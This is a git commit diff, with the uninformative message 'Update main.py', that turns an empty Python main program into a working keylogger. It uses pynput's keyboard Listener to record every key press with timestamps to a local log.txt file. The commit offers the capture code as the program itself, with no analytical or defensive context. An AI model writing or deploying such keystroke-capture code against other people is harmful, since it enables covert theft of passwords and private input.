7622449e79fd50dbc1aad6559fb6b07712cbe6f8
dudushy <eduardotalarico1337@gmail.com>
2022-05-03 17:07:27 -0300

    Update main.py

--- src/main.py
+++ src/main.py
@@ -1,16 +1,23 @@
 # pip freeze > requirements.txt
 #* -- Imports
 import os
+from pynput.keyboard import Listener
+import logging
 
 #* -- Variables
 path = os.path.dirname(__file__) #? Directory path
+logging.basicConfig(filename=f"{path}\\..\\log.txt", level=logging.DEBUG, format="[%(asctime)s] %(message)s")
 
 #* -- Functions
 def clearConsole() -> None: #? Clear console
     os.system("cls" if os.name == "nt" else "clear")
 
+def logKey(key) -> None: #? Log key
+    logging.info(str(key))
+
 def main() -> None:
-    pass
+    with Listener(on_press=logKey) as listener:
+        listener.join()
 
 #! Main
 if __name__ == "__main__":
